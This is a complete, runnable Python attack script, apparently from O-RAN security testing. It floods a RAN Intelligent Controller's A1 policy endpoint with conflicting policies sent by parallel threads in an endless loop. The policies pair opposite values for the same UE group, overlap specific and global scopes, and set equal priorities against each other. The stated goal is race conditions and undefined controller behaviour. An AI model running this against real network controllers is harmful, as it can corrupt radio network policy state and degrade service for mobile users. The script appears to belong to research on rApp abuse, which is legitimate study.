"""
ataque_policy_confusion.py - Ataque de Confusão de Políticas (rApp)
Alvo: Interface A1 do RIC - Conciliação de Políticas
Efeito: Envia politicas conflitantes SIMULTANEAMENTE:
    - Mesmo scope com valores opostos (True vs False)
    - Scopes sobrepostos (UE_GROUP_1 vs UE_GROUP_ALL)
    - Mesma prioridade competindo
    - Múltiplas threads concorrentes
    Causa: estado inconsistente no RIC, race conditions, comportamento indefinido.
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: POLICY CONFUSION (rApp)")
print(f"  Alvo: {BASE_URL}")
print("  Politicas conflitantes simultaneas - race conditions!")
print("=" * 60)

# Banco de politicas conflitantes pre-definidas
CONFLICT_POLICIES = [
    # Conflito 1: mesmo scope, valores opostos, mesma prioridade
    {"scope": "UE_GROUP_1", "value": True, "priority": "high", "reason": "ENERGY_SAVING"},
    {"scope": "UE_GROUP_1", "value": False, "priority": "high", "reason": "CANCEL_ENERGY_SAVING"},
    
    # Conflito 2: scopes sobrepostos (especifico vs geral)
    {"scope": "UE_GROUP_2", "value": True, "priority": "medium", "reason": "ENERGY_SAVING"},
    {"scope": "UE_GROUP_ALL", "value": False, "priority": "medium", "reason": "FORCE_CAPACITY"},
    
    # Conflito 3: mesmo scope, razoes diferentes
    {"scope": "UE_GROUP_3", "value": True, "priority": "low", "reason": "ENERGY_SAVING"},
    {"scope": "UE_GROUP_3", "value": False, "priority": "low", "reason": "LOAD_BALANCING"},
    
    # Conflito 4: prioridades diferentes para mesmo efeito
    {"scope": "UE_GROUP_4", "value": True, "priority": "critical", "reason": "ENERGY_SAVING_CRITICAL"},
    {"scope": "UE_GROUP_4", "value": False, "priority": "low", "reason": "USER_PREFERENCE"},
]

def enviar_politica(policy):
    """Envia uma politica individual"""
    try:
        ataque = {
            "type": "A1_POLICY",
            "scope": policy["scope"],
            "value": policy["value"],
            "reason": policy["reason"],
            "priority": policy["priority"],
            "conflict_group": random.randint(1, 10),
            "timestamp": time.time(),
            "nonce": random.randint(1, 999999)
        }
        data = json.dumps(ataque).encode()
        req = urllib.request.Request(BASE_URL, data=data, method="PUT")
        req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=2): pass
    except:
        pass

def ataque_policy_confusion():
    """Dispara politicas conflitantes em paralelo"""
    while True:
        try:
            # Seleciona 2-4 politicas conflitantes
            num_policies = random.randint(2, 4)
            selected = random.sample(CONFLICT_POLICIES, num_policies)
            
            threads = []
            for policy in selected:
                t = threading.Thread(target=enviar_politica, args=(policy,), daemon=True)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join(timeout=0.3)
            
            print(f"  [Confusion] {num_policies} politicas conflitantes disparadas")
            time.sleep(1.0)
            
        except Exception as e:
            print(f"[Confusion] Erro: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ataque_policy_confusion()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)